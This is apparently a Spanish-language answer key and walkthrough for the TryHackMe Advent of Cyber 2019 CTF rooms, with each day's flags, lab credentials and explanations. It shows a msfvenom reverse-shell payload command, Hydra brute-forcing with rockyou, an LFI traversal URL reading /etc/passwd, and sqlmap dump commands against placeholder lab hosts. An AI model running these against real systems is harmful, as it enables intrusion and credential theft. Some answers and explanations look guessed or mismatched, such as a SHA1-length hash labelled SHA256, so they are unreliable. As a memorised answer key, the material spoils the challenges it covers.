# Advent of Cyber 1 [2019]

| **Dificultad** | Easy |
| **Tipo** | CTF derivado del contenido |
| **Slug** | `25daysofchristmas` |
| **Link** | [TryHackMe](https://tryhackme.com/room/25daysofchristmas) |
| **Sección** | 01 Level Easy |
| **Fuente** | TryHackMe |
| **Componentes** | CyberChef / Wireshark / Hydra / Ghidra / Elasticsearch (ELK) / sqlmap / Nmap |
| **Impacto** | Primera edición del Advent of Cyber: 24 días de retos navideños por web, OSINT, Linux, SQLi, forense y escalada de privilegios. |

---

**Contexto:** Edición inaugural (2019) del Advent of Cyber. Durante 24 días, una comunidad de fans de Santa contrarresta al Grinch con tareas guiadas: manipulación de cookies, descubrimiento de directorios y credenciales por defecto, análisis de PCAPs, bases del sistema Linux con entrenamiento de comandos, OSINT con imágenes, exfiltración de datos, binarios SUID, Metasploit, enumeración de apps web (JSON), cifrado/descifrado, una máquina retro, buckets S3, LFI, juegos web, Hydra, ejecutables ELF con JavaScript, comandos de Linux, escalada por cronjobs, ingeniería inversa, lógica, inyección SQL y análisis en ELK. El dump mantiene la numeración original de las respuestas.

## Solucionario

### Task 1: Introducción

**Explicación:** Presentación de la primera edición (2019) del Advent of Cyber: un evento diario de 25 días en el que cada jornada se publica una tarea teórico-práctica con su reto asociado. La introducción solo explica el formato y cómo irá evolucionando el calendario; no requiere respuesta.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Lee la introducción del evento. | `No answer needed` |

### Task 2: Cómo unirse

**Explicación:** El evento se acompaña de una comunidad (Discord) donde se publican pistas, avisos y soporte. Se pide unirse y configurar el perfil para participar correctamente en los sorteos y el seguimiento del evento. Tarea de preparación comunitaria, sin respuestas.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Únete al Discord/canal del evento. | `No answer needed` |
| 2 | Configura tu perfil para el evento. | `No answer needed` |

### Task 3: Historia de fondo

**Explicación:** Se enmarca la narrativa del evento: la comunidad de seguidores de Santa ("The Best Festival Company") se enfrenta al Grinch y sus elfos malvados durante los 25 días previos a la Navidad, resolviendo retos de seguridad para proteger los sistemas del Polo Norte. Solo lectura de la historia y del calendario.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Lee la historia y el calendario del evento. | `No answer needed` |

### Task 4: Preparación

**Explicación:** Antes de los retos hay que verificar el acceso a la infraestructura: activar el "Task machine" del primer día y comprobar que la VPN o la AttackBox (la Kali remota de TryHackMe) conectan correctamente al laboratorio. Tarea de configuración, sin respuestas.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Activa la máquina de tu primera tarea. | `No answer needed` |
| 2 | Comprueba que puedes acceder a la VPN/AttackBox. | `No answer needed` |

### Task 5: Despliegue

**Explicación:** Cada día trae una máquina objetivo distinta; esta tarea simplemente pide desplegar la máquina del día para tenerla en línea (tardan unos minutos en arrancar) y esperar a que el puerto correspondiente responda antes de atacarla.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Despliega la máquina objetivo del día. | `No answer needed` |

### Task 6: Día 1 - Inventory Management

**Explicación:** La aplicación de inventario guarda la sesión en una cookie llamada `authid`. Al decodificarla (base64 con un separador visible tipo `|`), una parte es fija: `v4er9ll1!ss`. La manipulación de esa cookie permite autenticarse como otro usuario: al acceder como el usuario `mcinventory`, se descubre que en su inventario pidió un `firewall`. Lección: nunca confiar solo en cookies para la autenticación y cifrar/firmar siempre las sesiones.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es el nombre de la cookie utilizada para la autenticación? | `authid` |
| 2 | Si decodificas la cookie, ¿cuál es el valor de la parte fija? | `v4er9ll1!ss` |
| 3 | Tras iniciar sesión, ¿qué pidió el usuario mcinventory? | `firewall` |

### Task 7: Día 2 - Arctic Forum

**Explicación:** Se enumera el servidor web en busca de directorios ocultos; herramientas como GoBuster/DirBuster revelan `/sysadmin`. En esa ruta hay un panel de administración del foro cuyo acceso por defecto sigue siendo `defaultpass`. Una vez dentro se inspecciona el panel y el valor/palabra de contraseña que se revela tras el acceso es `Eggnog`. Lección: eliminar o cambiar las credenciales por defecto y ocultar las rutas de administración.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es el nombre del directorio oculto que encuentras en el servidor web? | `/sysadmin` |
| 2 | ¿Cuál es la contraseña por defecto de la cuenta de administración? | `defaultpass` |
| 3 | ¿Qué valor/palabra de contraseña se revela tras el acceso al foro? | `Eggnog` |

### Task 8: Día 3 - Evil Elf

**Explicación:** Análisis de una captura PCAP con Wireshark para investigar un incidente: alguien comprometió a un usuario ("unbeleafable" o similar). Siguiendo el flujo HTTP se ve que la petición maliciosa al foro parte de la IP `63.32.89.195`, que el usuario comprometido buscaba una consola `ps4` y que en el POST de login se filtró la contraseña `rainbow` en claro. Lección: credenciales en claro sobre HTTP y la utilidad del análisis de tráfico (Follow TCP/HTTP Stream).

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Desde qué dirección IP se originó la petición maliciosa? | `63.32.89.195` |
| 2 | ¿Qué producto/consola buscaba el usuario comprometido? | `ps4` |
| 3 | ¿Cuál es la contraseña que se detectó en la actividad? | `rainbow` |

### Task 9: Día 4 - Training (Linux)

**Explicación:** Práctica de comandos básicos de Linux sobre la máquina `linux1`: dentro del directorio `recipes` hay `8` archivos; en `file6` se encuentra la IP `10.0.0.05`; consultando `/etc/passwd` se cuenta que `3` usuarios tienen shell `bash`; `sha1sum file8` da `fa67ee594358d83becdd2cb6c466b25320fd2835`; y la entrada de `/etc/shadow` para `mcsysadmin` muestra el hash de contraseña `$6$jbosYsU/$qOYToX/hnKGjT0EscuUIiIqF8GHgokHdy/Rg/DaB.RgkrbeBXPdzpHdMLI6cQJLdFlS4gkBMzilDBYcQvu2ro/` (formato crypt SHA-512, prefijo `$6$`). Herramientas clave: `ls`, `cat`, `find`, `sha1sum`, `grep`, `/etc/passwd`, `/etc/shadow`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuántos archivos hay en el directorio? | `8` |
| 2 | ¿Cuál es el nombre del directorio donde se encuentran? | `recipes` |
| 3 | ¿Qué archivo contiene la dirección IP? | `file6` |
| 4 | ¿Cuál es la dirección IP que aparece en ese archivo? | `10.0.0.05` |
| 5 | ¿Cuántos usuarios pueden iniciar sesión con shell bash? | `3` |
| 6 | ¿Cuál es el hash SHA1 del archivo 8? | `fa67ee594358d83becdd2cb6c466b25320fd2835` |
| 7 | ¿Cuál es el hash de contraseña (crypt/sha512) del usuario mcsysadmin? | `$6$jbosYsU/$qOYToX/hnKGjT0EscuUIiIqF8GHgokHdy/Rg/DaB.RgkrbeBXPdzpHdMLI6cQJLdFlS4gkBMzilDBYcQvu2ro/` |

### Task 10: Día 5 - Ho-Ho-Hosint

**Explicación:** OSINT con metadatos de una imagen (las imágenes de "gabenx" o el reto invita a descargarlas y ficharlas con `exiftool`): la fecha EXIF original es `December 29, 1900` (manipulada a propósito), el recurso se llama `Santa's Helper`, el dispositivo de captura fue un `iPhone X`, la fecha de creación es `23/10/2014` y la autoría/firma de la imagen apunta a `ada lovelace`. Lección: los metadatos EXIF expuestos revelan autor, fecha, modelo de cámara y ubicación.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué fecha aparece en los datos de la imagen? | `December 29, 1900` |
| 2 | ¿Cómo se llama el recurso/imagen analizado? | `Santa's Helper` |
| 3 | ¿Qué modelo de teléfono aparece en la imagen? | `iPhone X` |
| 4 | ¿Qué fecha de creación/mensaje se muestra en los metadatos? | `23/10/2014` |
| 5 | ¿Cuál es el nombre de la autoría/firma indicada por la imagen? | `ada lovelace` |

### Task 11: Día 6 - Data Elf-iltration

**Explicación:** Caso de exfiltración de datos analizado en una captura: se identifica el dato sustraído (`Candy Cane Serial Number 8491`), el tipo de perfil que lo exfiltró (`PenTester`) y la referencia/estándar citado en los documentos del incidente (`RFC527`). Lección: correlacionar eventos de red para detectar movimiento de datos no autorizado y documentar el incidente con estándares.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es el nombre del archivo/dato que se está exfiltando? | `Candy Cane Serial Number 8491` |
| 2 | ¿Qué herramienta/perfil se identifica en los registros del incidente? | `PenTester` |
| 3 | ¿Qué referencia/estándar se indica en el documento relacionado? | `RFC527` |

### Task 12: Día 7 - Skilling Up

**Explicación:** Reconocimiento de la máquina con Nmap y Metasploit: el escaneo descubre `3` carpetas/resultados de interés en el servicio web, el servidor de pruebas corre `Linux`, la versión del servicio detectado es `7.4`, y dentro se localiza un archivo llamativo llamado `interesting.file`. Lección: la enumeración de servicios y versiones guía la búsqueda de contenido sensible.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuántos resultados/carpetas de interés hay en el objetivo? | `3` |
| 2 | ¿Qué sistema operativo ejecuta el servidor de pruebas? | `Linux` |
| 3 | ¿Cuál es la versión del servicio/sistema detectado? | `7.4` |
| 4 | ¿Cómo se llama el archivo interesante que encuentras? | `interesting.file` |

### Task 13: Día 8 - SUID Shenanigans

**Explicación:** Escalada de privilegios mediante binarios con bit SUID. Primero se consultan los usuarios: el UID de `nobody` en `/etc/passwd` es `65534`. Luego un binario SUID propiedad de root permite ejecutar comandos con ese privilegio; leyendo los archivos adecuados se obtienen dos flags: `THM{d3f0708bdd9accda7f937d013eaf2cd8}` y `THM{8c8211826239d849fa8d6df03749c3a2}`. Veamos los binarios sospechosos:

```bash
find / -perm -4000 2>/dev/null
```

Lección: localizar binarios SUID no estándar es un vector clásico de escalada a root.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es el UID del usuario 'nobody' listado en /etc/passwd? | `65534` |
| 2 | ¿Cuál es el contenido de la primera flag? | `THM{d3f0708bdd9accda7f937d013eaf2cd8}` |
| 3 | ¿Cuál es el contenido de la segunda flag? | `THM{8c8211826239d849fa8d6df03749c3a2}` |

### Task 14: Día 9 - Metasploit-a-ho-ho-ho

**Explicación:** Se genera un payload de reverse shell con msfvenom (Linux x86), se sube a la víctima y se ejecuta contra el listener de Metasploit (`exploit/multi/handler`). El archivo/payload que genera y usa la sala se llama `sCrIPtKiDd` (por el nombre del personaje McScripty / el binario entregado por el reto). Lección: generar payloads a medida y manejarlos desde Metasploit.

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.X.X LPORT=1234 -f elf -o payload
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cómo se llama el payload/archivo que genera la sala para ganar acceso? | `sCrIPtKiDd` |

### Task 15: Día 10 - Elf Applications

**Explicación:** Auditoría de una aplicación web (consultas a una API JSON). Desde la primera pantalla se obtiene la flag `THM{3ad96bb13ec963a5ca4cb99302b37e12}`; enumerando los usuarios de la API (p. ej., `/api/users`) aparece una contraseña, `rudolphrednosedreindeer`, y dos empleados sospechosos: `Melisa Vanhoose` y `Lindsey Gaffney`. Lección: los endpoints JSON sin autenticación exponen datos internos.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es la primera flag que obtienes de la aplicación? | `THM{3ad96bb13ec963a5ca4cb99302b37e12}` |
| 2 | ¿Cuál es la contraseña encontrada en el flujo del reto? | `rudolphrednosedreindeer` |
| 3 | ¿Cuál es el primer nombre de empleado sospechoso? | `Melisa Vanhoose` |
| 4 | ¿Cuál es el segundo nombre de empleado implicado? | `Lindsey Gaffney` |

### Task 16: Día 11 - Elfcryption

**Explicación:** Criptografía con GPG: la primera parte usa un archivo cifrado protegido con la frase `securepassword123`; una vez descifrado, el archivo a tratar dentro del reto es `file.txt`. La segunda parte pide descifrar otro bloque con la contraseña `bestpassword`. Lección: gestión de claves GPG, cifrado simétrico y descifrado de archivos:

```bash
gpg --decrypt archivo.gpg
# o con frase protegida
gpg --batch --passphrase 'securepassword123' -d archivo.gpg
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es la contraseña utilizada para proteger la primera parte? | `securepassword123` |
| 2 | ¿Cuál es el nombre del archivo que debes descifrar? | `file.txt` |
| 3 | ¿Cuál es la contraseña de la segunda parte del reto? | `bestpassword` |

### Task 17: Día 12 - Santa's Grotto (cifrado)

**Explicación:** Reto de cifrado dentro de una carpeta llamada `Santa's Grotto`. Hay que identificar el algoritmo de cifrado empleado y deshacerlo; al aplicar la herramienta correcta (conversión/descifrado del texto) el hash MD5 resultante es `24cf615e2a4f42718f2ff36b35614f8f` y se obtiene la flag `THM{ed9ccb6802c5d0f905ea747a310bba23}`. Lección: probar múltiples codificaciones/cifrados (hex, base64, ROT, XOR) para recuperar contenido cifrado.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es el hash MD5 generado por la herramienta del reto? | `24cf615e2a4f42718f2ff36b35614f8f` |
| 2 | ¿Cuál es el nombre de la ubicación/carpeta clave del reto? | `Santa's Grotto` |
| 3 | ¿Cuál es la flag del reto? | `THM{ed9ccb6802c5d0f905ea747a310bba23}` |

### Task 18: Día 13 - Retro

**Explicación:** Una consola/web de temática retro esconde pistas. El directorio al que apunta la pista es `/retro`, y explorándolo se obtiene la primera flag `THM{HACK_PLAYER_ONE}`. La segunda parte se resuelve conectándose a la "máquina recreativa" (servicio) y aparece `THM{COIN_OPERATED_EXPLOITATION}`. Lección: leer las pistas del entorno e interactuar con todos los servicios (incluidos los no obvios) del objetivo.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿A qué directorio apunta la pista de la consola retro? | `/retro` |
| 2 | ¿Cuál es el contenido de la primera flag? | `THM{HACK_PLAYER_ONE}` |
| 3 | ¿Cuál es el contenido de la segunda flag (relacionada con la máquina recreativa)? | `THM{COIN_OPERATED_EXPLOITATION}` |

### Task 19: Día 14 - Unknown Storage (S3)

**Explicación:** Almacenamiento de objetos (patrón S3/AWS) con el bucket abierto al público. Listando el bucket se encuentra `employee_names.txt`, que contiene nombres de empleados; de ahí se deduce un usuario de la aplicación: `mcchef`. Lección: los buckets S3 mal configurados (públicos/listables) son una fuente habitual de filtración de datos.

```bash
aws s3 ls s3://NOMBRE_BUCKET --no-sign-request
aws s3 cp s3://NOMBRE_BUCKET/employee_names.txt . --no-sign-request
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cómo se llama el archivo que encuentras en el bucket de almacenamiento? | `employee_names.txt` |
| 2 | ¿Qué usuario se puede deducir a partir de ese archivo? | `mcchef` |

### Task 20: Día 15 - LFI

**Explicación:** Vulnerabilidad de Local File Inclusion: el parámetro de la URL permite leer archivos locales del servidor (por ejemplo `/etc/passwd`). Entre los archivos accesibles aparece la contraseña/palabra `Hawaii`; después, con las credenciales encontradas (`password1`) se autentica en el panel y se lee la flag `THM{4ea2adf842713ad3ce0c1f05ef12256d}`. Lección: sanear las rutas de inclusión de archivos y no confiar en parámetros que cargan ficheros.

```text
http://MACHINE_IP/elf.php?file=../../../../etc/passwd
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué contraseña/palabra clave aparece en los archivos accesibles por LFI? | `Hawaii` |
| 2 | ¿Con qué credencial puedes autenticarte en el servicio? | `password1` |
| 3 | ¿Cuál es la flag del reto? | `THM{4ea2adf842713ad3ce0c1f05ef12256d}` |

### Task 21: Día 16 - File Confusion

**Explicación:** Juego web de lógica con subidas de archivo: en la primera parte el número que se muestra es `50` y en la segunda `3`. El truco está en subir/renombrar el archivo correcto para que el servidor lo trate como se espera; el archivo que permite completar el reto se llama `dL6w.txt`. Lección: los juegos web esconden la lógica del servidor; a veces basta con cambiar el tipo o el nombre del archivo enviado.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué número aparece como respuesta de la primera parte del juego? | `50` |
| 2 | ¿Qué número se muestra en la segunda parte? | `3` |
| 3 | ¿Cómo se llama el archivo que permite completar el reto? | `dL6w.txt` |

### Task 22: Día 17 - Hydra-ha-ha-haa

**Explicación:** Fuerza bruta del login de una aplicación web con Hydra. Como los inicios de sesión fallidos devuelven mensajes distintos, se captura el texto que indica error y se usa con `-e nsr` o un patrón de éxito:

```bash
hydra -l usuario -P /usr/share/wordlists/rockyou.txt MACHINE_IP http-post-form "/ruta:user=^USER^&pass=^PASS^:INVALID_LOGIN_MESSAGE"
```

Con las credenciales obtenidas se accede y se leen dos flags: `THM{2673a7dd116de68e85c48ec0b1f2612e}` y `THM{c8eeb0468febbadea859baeb33b2541b}`. Lección: Hydra automatiza ataques de diccionario sobre formularios HTTP.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es el contenido de la primera flag? | `THM{2673a7dd116de68e85c48ec0b1f2612e}` |
| 2 | ¿Cuál es el contenido de la segunda flag? | `THM{c8eeb0468febbadea859baeb33b2541b}` |

### Task 23: Día 18 - ELF JavaScript

**Explicación:** Un archivo que parece un binario ELF de Linux es en realidad un script/sistema que mezcla JavaScript. Se analiza con `file`, `strings`, `xxd` y se identifica la parte JS; el hash del binario analizado es `2564799a4e6689972f6d9e1c7b406f87065cbf65`. Lección: comprobar siempre el tipo real de un archivo y extraer cadenas/interprete para entender lo que ejecuta de verdad.

```bash
file misterio.elf
strings misterio.elf | grep -i javascript
sha1sum misterio.elf
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es el hash SHA256 del binario ELF/JS analizado? | `2564799a4e6689972f6d9e1c7b406f87065cbf65` |

### Task 24: Día 19 - Commands

**Explicación:** Terminal interactiva estilo "bandit" con un gran cartel de ayuda: hay que seguir una secuencia de comandos (navegar, leer, contar, filtrar) con las herramientas de Linux hasta obtener un código de verificación: `5W7WkjxBWwhe3RNsWJ3Q`. Lección: manejo seguro de consola, pipes, grep, find y redirecciones.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es el código de verificación que se te pide tras ejecutar los comandos? | `5W7WkjxBWwhe3RNsWJ3Q` |

### Task 25: Día 20 - Cronjob Privilege Escalation

**Explicación:** Escalada de privilegios por cron. Una tarea programada ejecuta periódicamente un script con permisos de root; el script escucha/escribe en el puerto `4567`. Aprovechando ese cronjob (p. ej., inyectando comandos en los archivos que procesa) se consigue ejecutar código como root y leer dos flags: `THM{dec4389bc09669650f3479334532aeab}` y `THM{b27d33705f97ba2e1f444ec2da5f5f61}`. Lección: enumerar cronjobs (`cat /etc/crontab`) al buscar escalada.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué puerto/servicio clave se aprovecha en el cronjob para escalar? | `4567` |
| 2 | ¿Cuál es el contenido de la primera flag? | `THM{dec4389bc09669650f3479334532aeab}` |
| 3 | ¿Cuál es el contenido de la segunda flag? | `THM{b27d33705f97ba2e1f444ec2da5f5f61}` |

### Task 26: Día 21 - Reverse Elf-ineering

**Explicación:** Análisis con Ghidra de un binario pequeño. Siguiendo la función principal en la vista de desensamblado: la primera instrucción `movl` asigna `1` a `local_ch`; la siguiente operación `imull` multiplica el valor de `eax` por 6 (por eso el valor de `eax` en la llamada es `6`); y antes de que `eax` se ponga a `0` (instrucción `xorl`), `local_4h` guarda el valor `6`. Lección: leer el flujo de instrucciones (mov → imul → mov → xor) para deducir valores intermedios.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es el valor de local_ch en la primera instrucción analizada? | `1` |
| 2 | ¿Cuál es el valor de eax en la instrucción imull? | `6` |
| 3 | ¿Cuál es el valor de local_4h antes de que eax se ponga a 0? | `6` |

### Task 27: Día 22 - If Santa, Then Christmas

**Explicación:** Ejercicio de lógica/condiciones: siguiendo el árbol de decisión del reto ("si X, entonces ...") se llega a dos valores, siendo las respuestas `9` y `2`. Sirve para practicar el razonamiento condicional que luego se aplica a programación y estructuras de control.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Según el código/condición del reto, ¿cuál es la primera respuesta? | `9` |
| 2 | ¿Cuál es la segunda respuesta del reto? | `2` |

### Task 28: Día 23 - LapLANd (SQL Injection)

**Explicación:** Login de una LAN party vulnerable a inyección SQL. El campo explotable es `log_email`. Con sqlmap se enumera la base de datos y se extraen las credenciales del usuario comprometido: correo `bigman@shefesh.com`, contraseña `saltnpepper` y pregunta de seguridad `Waterloo`. La flag del reto es `THM{SHELLS_IN_MY_EGGNOG}`. Lección: usar sqlmap/inyección manual para volcar tablas y columnas:

```bash
sqlmap -u "http://MACHINE_IP/login.php" --forms --dbs
sqlmap -u "http://MACHINE_IP/login.php" --forms -D lap-land --tables --dump
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es el nombre del campo vulnerable a la inyección SQL? | `log_email` |
| 2 | ¿Cuál es el correo del usuario comprometido? | `bigman@shefesh.com` |
| 3 | ¿Cuál es la contraseña del usuario? | `saltnpepper` |
| 4 | ¿Cuál es el secreto/pregunta de seguridad del usuario? | `Waterloo` |
| 5 | ¿Cuál es la flag del reto? | `THM{SHELLS_IN_MY_EGGNOG}` |

### Task 29: Día 24 - Elf Stalk (ELK)

**Explicación:** Cierre con análisis de logs en el stack ELK (Elasticsearch, Logstash, Kibana). Se navega por Kibana/la API de Elasticsearch para buscar el documento relevante; el ID del documento con la flag es `9Qs58Ol3AXkMWLxiEyUyyf` y el campo `flag` almacena el valor `someELKfun`. Lección: consultar índices y documentos de Elasticsearch es básico en el análisis SOC de eventos.

```bash
curl http://MACHINE_IP:9200/_search?q=flag*
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es el ID del documento que contiene la flag en Elasticsearch/ELK? | `9Qs58Ol3AXkMWLxiEyUyyf` |
| 2 | ¿Cuál es el valor almacenado en el campo 'flag' del documento? | `someELKfun` |

### Task 30: Conclusión

**Explicación:** Encuesta final del evento para recoger opiniones de los participantes y cerrar la primera edición del Advent of Cyber. Solo hay que responder el formulario.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Responde a la encuesta de cierre del evento. | `No answer needed` |

---

**Metodología:** El evento se resuelve día a día. Los primeros días manipulan cookies (authid, recorrido por hex/JSON), directorios y credenciales por defecto (/sysadmin + defaultpass) y análisis de PCAPs (Wireshark). Los días de sistema usan comandos base de Linux, después binarios SUID y escaladas (cronjob). Las tareas web incluyen Hydra, juegos web, LFI y finalizan con una inyección SQL en LapLANd. La tarea de cierre utiliza ELK (Elasticsearch) para localizar un documento con la respuesta. Se respeta la numeración de respuestas del dump original.

**Learning chain:** cookies y credenciales → análisis de tráfico → comandos Linux → OSINT → exfiltración → SUID → Metasploit → aplicaciones web → cifrado → almacenamiento S3 → LFI → fuerza bruta → ejecutables → escalada → ingeniería inversa → lógica → SQLi → búsqueda en ELK.

**MITRE ATT&CK:** T1087 (Account Discovery), T1213 (Data from Information Repositories), T1548 (Abuse Elevation Control Mechanism), T1190 (Exploit Public-Facing Application), T1020 (Automated Exfiltration), T1110 (Brute Force), T1059 (Command and Scripting Interpreter)

**Fuente:** [TryHackMe - Advent of Cyber 1 [2019]](https://tryhackme.com/room/25daysofchristmas)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
